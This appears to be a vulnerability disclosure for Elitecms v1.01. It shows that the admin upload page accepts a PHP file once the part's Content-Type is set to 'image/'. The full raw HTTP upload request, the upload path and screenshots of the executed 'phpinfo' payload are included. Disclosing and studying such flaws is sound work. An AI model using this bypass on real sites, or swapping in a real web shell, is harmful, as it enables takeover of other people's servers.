# Elitecms v1.01 by elitecms has arbitrary code execution (RCE)

vendor: https://elitecms.net/download.php

Vulnerability url: http://ip/eliteCMS1.01/admin/manage_uploads.php

Loophole location： Arbitrary file upload vulnerability (RCE) exists in the "manage_uploads" module in the background management system.

**The key point is "Content-Type: image/". We successfully bypass the detection of the image using "image/".**

Request package for file upload：

```sql
POST /eliteCMS1.01/admin/manage_uploads.php HTTP/1.1
Host: 192.168.1.108
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.108/eliteCMS1.01/admin/manage_uploads.php
Cookie: PHPSESSID=307ef75a2f3ab4c1103d8a1e90cf120e
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------4519189897082
Content-Length: 311

-----------------------------4519189897082
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/ 

JFJF
<?php phpinfo();?>
-----------------------------4519189897082
Content-Disposition: form-data; name="submit"

Add Image
-----------------------------4519189897082--
```

The files will be uploaded to this directory \elitecms1.01\uploads\

![image](https://user-images.githubusercontent.com/54017627/167533036-301b2877-92d6-4f98-9294-b59e0c6b927f.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/167533122-a16f4c43-835b-4dba-99be-6c5e46caaa0f.png)

